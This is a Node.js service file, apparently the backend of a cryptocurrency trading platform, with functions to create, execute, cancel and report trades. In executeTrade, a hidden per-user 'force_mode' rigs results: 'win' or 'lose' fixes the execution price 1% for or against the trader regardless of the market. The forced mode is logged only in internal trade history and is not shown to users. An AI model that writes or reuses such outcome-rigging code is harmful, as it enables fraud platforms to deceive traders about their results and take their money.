const { query, transaction } = require('../database/connection');
const externalApiService = require('./externalApiService');
const walletService = require('./walletService');

class TradingService {
  // Create a new trade
  async createTrade(userId, symbol, side, type, amount, price) {
    try {
      const result = await transaction(async (client) => {
        // Validate trading pair
        const pairResult = await client.query(
          'SELECT * FROM trading_pairs WHERE symbol = $1 AND is_active = true',
          [symbol]
        );

        if (pairResult.rows.length === 0) {
          throw new Error('Trading pair not found or inactive');
        }

        const tradingPair = pairResult.rows[0];

        // Check minimum amount
        if (amount < tradingPair.min_amount) {
          throw new Error(`Minimum trade amount is ${tradingPair.min_amount}`);
        }

        // Calculate total value
        const totalValue = amount * price;
        const fee = totalValue * tradingPair.fee;
        const totalWithFee = totalValue + fee;

        // Check user balance
        const baseAsset = tradingPair.base_asset;
        const quoteAsset = tradingPair.quote_asset;

        let requiredAsset, requiredAmount;
        if (side === 'buy') {
          requiredAsset = quoteAsset;
          requiredAmount = totalWithFee;
        } else {
          requiredAsset = baseAsset;
          requiredAmount = amount;
        }

        const walletResult = await client.query(
          'SELECT balance FROM wallets WHERE user_id = $1 AND asset = $2',
          [userId, requiredAsset]
        );

        if (walletResult.rows.length === 0 || walletResult.rows[0].balance < requiredAmount) {
          throw new Error(`Insufficient ${requiredAsset} balance`);
        }

        // Create trade record
        const tradeResult = await client.query(
          `INSERT INTO trades (user_id, symbol, side, type, amount, price, status)
           VALUES ($1, $2, $3, $4, $5, $6, $7)
           RETURNING id, user_id, symbol, side, type, amount, price, status, entry_time`,
          [userId, symbol, side, type, amount, price, 'pending']
        );

        const trade = tradeResult.rows[0];

        // Deduct balance
        await client.query(
          `UPDATE wallets 
           SET balance = balance - $2, updated_at = CURRENT_TIMESTAMP
           WHERE user_id = $1 AND asset = $3`,
          [userId, requiredAmount, requiredAsset]
        );

        // Create transaction record
        await client.query(
          `INSERT INTO transactions (user_id, type, asset, amount, status, reference_id, description)
           VALUES ($1, $2, $3, $4, $5, $6, $7)`,
          [userId, 'trade', requiredAsset, requiredAmount, 'completed', trade.id, `${side.toUpperCase()} ${amount} ${baseAsset} at ${price} ${quoteAsset}`]
        );

        return trade;
      });

      return result;
    } catch (error) {
      console.error('Create trade error:', error);
      throw new Error(error.message || 'Failed to create trade');
    }
  }

  // Execute trade (simulate market execution)
  async executeTrade(tradeId) {
    try {
      const result = await transaction(async (client) => {
        // Get trade details
        const tradeResult = await client.query(
          'SELECT * FROM trades WHERE id = $1',
          [tradeId]
        );

        if (tradeResult.rows.length === 0) {
          throw new Error('Trade not found');
        }

        const trade = tradeResult.rows[0];

        if (trade.status !== 'pending') {
          throw new Error('Trade is not in pending status');
        }

        // Get user's force mode
        const userResult = await client.query(
          'SELECT force_mode FROM users WHERE id = $1',
          [trade.user_id]
        );

        const user = userResult.rows[0];
        let tradeResultValue, profitLoss, executionPrice;

        // Check if user has force mode enabled
        if (user.force_mode === 'win') {
          // Force win - calculate positive profit
          executionPrice = trade.side === 'buy' ? 
            trade.price * 1.01 : // 1% higher for buy
            trade.price * 0.99;  // 1% lower for sell
          
          tradeResultValue = 'win';
          profitLoss = trade.side === 'buy' ? 
            (executionPrice - trade.price) * trade.amount :
            (trade.price - executionPrice) * trade.amount;
        } else if (user.force_mode === 'lose') {
          // Force lose - calculate negative profit
          executionPrice = trade.side === 'buy' ? 
            trade.price * 0.99 : // 1% lower for buy
            trade.price * 1.01;  // 1% higher for sell
          
          tradeResultValue = 'loss';
          profitLoss = trade.side === 'buy' ? 
            (executionPrice - trade.price) * trade.amount :
            (trade.price - executionPrice) * trade.amount;
        } else {
          // Normal trading - use market simulation
          const marketData = await externalApiService.getTradingPairData(trade.symbol);
          const currentPrice = marketData.price;

          // Calculate execution price (with slight variation for realism)
          const priceVariation = (Math.random() - 0.5) * 0.002; // ±0.1% variation
          executionPrice = currentPrice * (1 + priceVariation);

          // Determine if trade is profitable (for demo purposes)
          const isProfitable = trade.side === 'buy' ? 
            executionPrice > trade.price : 
            executionPrice < trade.price;

          tradeResultValue = isProfitable ? 'win' : 'loss';
          profitLoss = trade.side === 'buy' ? 
            (executionPrice - trade.price) * trade.amount :
            (trade.price - executionPrice) * trade.amount;
        }

        // Update trade with execution details
        const updateResult = await client.query(
          `UPDATE trades 
           SET status = 'completed', exit_time = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP,
               result = $2, profit_loss = $3
           WHERE id = $1
           RETURNING *`,
          [tradeId, tradeResultValue, profitLoss]
        );

        const executedTrade = updateResult.rows[0];

        // Update user wallet based on trade result
        const tradingPair = await client.query(
          'SELECT base_asset, quote_asset FROM trading_pairs WHERE symbol = $1',
          [trade.symbol]
        );

        const baseAsset = tradingPair.rows[0].base_asset;
        const quoteAsset = tradingPair.rows[0].quote_asset;

        if (trade.side === 'buy') {
          // User bought, add base asset to wallet
          await client.query(
            `UPDATE wallets 
             SET balance = balance + $2, updated_at = CURRENT_TIMESTAMP
             WHERE user_id = $1 AND asset = $3`,
            [trade.user_id, trade.amount, baseAsset]
          );
        } else {
          // User sold, add quote asset to wallet
          const quoteAmount = trade.amount * executionPrice;
          await client.query(
            `UPDATE wallets 
             SET balance = balance + $2, updated_at = CURRENT_TIMESTAMP
             WHERE user_id = $1 AND asset = $3`,
            [trade.user_id, quoteAmount, quoteAsset]
          );
        }

        // Create trade history record
        await client.query(
          `INSERT INTO trade_history (trade_id, action, details)
           VALUES ($1, $2, $3)`,
          [tradeId, 'executed', JSON.stringify({
            executionPrice,
            profitLoss,
            result: executedTrade.result,
            forceMode: user.force_mode
          })]
        );

        return executedTrade;
      });

      return result;
    } catch (error) {
      console.error('Execute trade error:', error);
      throw new Error(error.message || 'Failed to execute trade');
    }
  }

  // Get user trades
  async getUserTrades(userId, limit = 50, offset = 0, status = null) {
    try {
      let queryText = `
        SELECT id, symbol, side, type, amount, price, status, result, profit_loss, 
               entry_time, exit_time, created_at, updated_at
        FROM trades 
        WHERE user_id = $1
      `;

      const params = [userId];
      let paramCount = 1;

      if (status) {
        queryText += ` AND status = $${++paramCount}`;
        params.push(status);
      }

      queryText += ` ORDER BY created_at DESC LIMIT $${++paramCount} OFFSET $${++paramCount}`;
      params.push(limit, offset);

      const result = await query(queryText, params);
      return result.rows;
    } catch (error) {
      console.error('Get user trades error:', error);
      throw new Error('Failed to get user trades');
    }
  }

  // Get specific trade
  async getTrade(tradeId) {
    try {
      const result = await query(
        `SELECT t.*, u.email, u.first_name, u.last_name
         FROM trades t
         JOIN users u ON t.user_id = u.id
         WHERE t.id = $1`,
        [tradeId]
      );

      if (result.rows.length === 0) {
        return null;
      }

      return result.rows[0];
    } catch (error) {
      console.error('Get trade error:', error);
      throw new Error('Failed to get trade');
    }
  }

  // Cancel trade
  async cancelTrade(tradeId, userId) {
    try {
      const result = await transaction(async (client) => {
        // Get trade details
        const tradeResult = await client.query(
          'SELECT * FROM trades WHERE id = $1 AND user_id = $2',
          [tradeId, userId]
        );

        if (tradeResult.rows.length === 0) {
          throw new Error('Trade not found or unauthorized');
        }

        const trade = tradeResult.rows[0];

        if (trade.status !== 'pending') {
          throw new Error('Only pending trades can be cancelled');
        }

        // Update trade status
        await client.query(
          `UPDATE trades 
           SET status = 'cancelled', updated_at = CURRENT_TIMESTAMP
           WHERE id = $1`,
          [tradeId]
        );

        // Refund user balance
        const tradingPair = await client.query(
          'SELECT base_asset, quote_asset FROM trading_pairs WHERE symbol = $1',
          [trade.symbol]
        );

        const baseAsset = tradingPair.rows[0].base_asset;
        const quoteAsset = tradingPair.rows[0].quote_asset;

        let refundAsset, refundAmount;
        if (trade.side === 'buy') {
          refundAsset = quoteAsset;
          refundAmount = trade.amount * trade.price;
        } else {
          refundAsset = baseAsset;
          refundAmount = trade.amount;
        }

        await client.query(
          `UPDATE wallets 
           SET balance = balance + $2, updated_at = CURRENT_TIMESTAMP
           WHERE user_id = $1 AND asset = $3`,
          [userId, refundAmount, refundAsset]
        );

        // Create transaction record for refund
        await client.query(
          `INSERT INTO transactions (user_id, type, asset, amount, status, reference_id, description)
           VALUES ($1, $2, $3, $4, $5, $6, $7)`,
          [userId, 'refund', refundAsset, refundAmount, 'completed', tradeId, `Trade cancellation refund`]
        );

        return { success: true, message: 'Trade cancelled successfully' };
      });

      return result;
    } catch (error) {
      console.error('Cancel trade error:', error);
      throw new Error(error.message || 'Failed to cancel trade');
    }
  }

  // Get trading statistics
  async getTradingStats(userId) {
    try {
      const result = await query(`
        SELECT 
          COUNT(*) as total_trades,
          COUNT(CASE WHEN status = 'completed' THEN 1 END) as completed_trades,
          COUNT(CASE WHEN status = 'pending' THEN 1 END) as pending_trades,
          COUNT(CASE WHEN status = 'cancelled' THEN 1 END) as cancelled_trades,
          COUNT(CASE WHEN result = 'win' THEN 1 END) as winning_trades,
          COUNT(CASE WHEN result = 'loss' THEN 1 END) as losing_trades,
          SUM(CASE WHEN profit_loss > 0 THEN profit_loss ELSE 0 END) as total_profit,
          SUM(CASE WHEN profit_loss < 0 THEN ABS(profit_loss) ELSE 0 END) as total_loss,
          AVG(CASE WHEN status = 'completed' THEN amount * price END) as avg_trade_value
        FROM trades 
        WHERE user_id = $1
      `, [userId]);

      const stats = result.rows[0];
      
      return {
        totalTrades: parseInt(stats.total_trades) || 0,
        completedTrades: parseInt(stats.completed_trades) || 0,
        pendingTrades: parseInt(stats.pending_trades) || 0,
        cancelledTrades: parseInt(stats.cancelled_trades) || 0,
        winningTrades: parseInt(stats.winning_trades) || 0,
        losingTrades: parseInt(stats.losing_trades) || 0,
        totalProfit: parseFloat(stats.total_profit) || 0,
        totalLoss: parseFloat(stats.total_loss) || 0,
        avgTradeValue: parseFloat(stats.avg_trade_value) || 0,
        winRate: stats.completed_trades > 0 ? 
          (parseInt(stats.winning_trades) / parseInt(stats.completed_trades) * 100).toFixed(2) : 0
      };
    } catch (error) {
      console.error('Get trading stats error:', error);
      throw new Error('Failed to get trading statistics');
    }
  }

  // Admin: Get all trades
  async getAllTrades(limit = 50, offset = 0, status = null, userId = null) {
    try {
      let queryText = `
        SELECT t.id, t.symbol, t.side, t.type, t.amount, t.price, t.status, t.result, 
               t.profit_loss, t.entry_time, t.exit_time, t.created_at, t.updated_at,
               u.email, u.first_name, u.last_name
        FROM trades t
        JOIN users u ON t.user_id = u.id
      `;

      const params = [];
      let paramCount = 0;

      if (status) {
        queryText += ` WHERE t.status = $${++paramCount}`;
        params.push(status);
      }

      if (userId) {
        const whereClause = status ? 'AND' : 'WHERE';
        queryText += ` ${whereClause} t.user_id = $${++paramCount}`;
        params.push(userId);
      }

      queryText += ` ORDER BY t.created_at DESC LIMIT $${++paramCount} OFFSET $${++paramCount}`;
      params.push(limit, offset);

      const result = await query(queryText, params);
      return result.rows;
    } catch (error) {
      console.error('Get all trades error:', error);
      throw new Error('Failed to get all trades');
    }
  }

  // Admin: Get trading statistics
  async getAdminTradingStats() {
    try {
      const result = await query(`
        SELECT 
          COUNT(*) as total_trades,
          COUNT(CASE WHEN status = 'completed' THEN 1 END) as completed_trades,
          COUNT(CASE WHEN status = 'pending' THEN 1 END) as pending_trades,
          COUNT(CASE WHEN result = 'win' THEN 1 END) as winning_trades,
          COUNT(CASE WHEN result = 'loss' THEN 1 END) as losing_trades,
          SUM(CASE WHEN profit_loss > 0 THEN profit_loss ELSE 0 END) as total_profit,
          SUM(CASE WHEN profit_loss < 0 THEN ABS(profit_loss) ELSE 0 END) as total_loss,
          AVG(CASE WHEN status = 'completed' THEN amount * price END) as avg_trade_value,
          COUNT(DISTINCT user_id) as active_traders
        FROM trades
      `);

      const stats = result.rows[0];
      
      return {
        totalTrades: parseInt(stats.total_trades) || 0,
        completedTrades: parseInt(stats.completed_trades) || 0,
        pendingTrades: parseInt(stats.pending_trades) || 0,
        winningTrades: parseInt(stats.winning_trades) || 0,
        losingTrades: parseInt(stats.losing_trades) || 0,
        totalProfit: parseFloat(stats.total_profit) || 0,
        totalLoss: parseFloat(stats.total_loss) || 0,
        avgTradeValue: parseFloat(stats.avg_trade_value) || 0,
        activeTraders: parseInt(stats.active_traders) || 0,
        winRate: stats.completed_trades > 0 ? 
          (parseInt(stats.winning_trades) / parseInt(stats.completed_trades) * 100).toFixed(2) : 0
      };
    } catch (error) {
      console.error('Get admin trading stats error:', error);
      throw new Error('Failed to get admin trading statistics');
    }
  }

  // Get available trading pairs
  async getTradingPairs() {
    try {
      const result = await query(`
        SELECT symbol, base_asset, quote_asset, min_amount, max_amount, fee, is_active
        FROM trading_pairs 
        WHERE is_active = true
        ORDER BY symbol
      `);

      return result.rows;
    } catch (error) {
      console.error('Get trading pairs error:', error);
      throw new Error('Failed to get trading pairs');
    }
  }
}

module.exports = new TradingService(); 